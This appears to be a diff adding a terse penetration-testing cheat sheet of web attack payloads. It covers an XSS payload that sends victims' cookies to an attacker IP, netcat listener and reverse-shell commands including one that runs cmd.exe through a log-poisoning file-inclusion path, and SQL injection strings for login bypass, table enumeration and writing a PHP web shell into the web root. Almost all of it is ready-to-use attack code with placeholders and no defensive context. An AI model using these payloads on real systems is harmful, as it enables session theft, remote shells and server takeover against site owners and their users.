@@ -1,0 +1,26 @@
+-------------------- XSS --------------------
+On attacker machine set listener 
+     # nc -nlvp <[PORT]>
+On victim website 
+     <script>new Image().src="http://<[IP]>:<[PORT]>/test.php?output="+document.cookie;</script>
+
+-------------------- LFI/RFI --------------------
+Connect via netcat to victim 
+     # nc -nv <[IP]> <[PORT]>) 
+     # nc -nv <[IP]> <[PORT]> -e cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00
+     
+-------------------- SQL Injection --------------------
+Bse:
+     any' or 1=1 limit 1;-- 
+
+Number of columns:
+     order by 1, order by 2, ...
+
+Expose data from database:
+     UNION select 1,2,3,4,5,6
+
+Enum tables:
+     UNION select 1,2,3,4,table_name,6 FROM information_schema.tables
+
+Shell upload:
+     <[IP]>:<[PORT]>/<[URL]>.php?<[PARAMETER]>=999 union select 1,2,"<?php echo shell_exec($_GET['cmd']);?>",4,5,6 into OUTFILE '/var/www/html/evil.php'
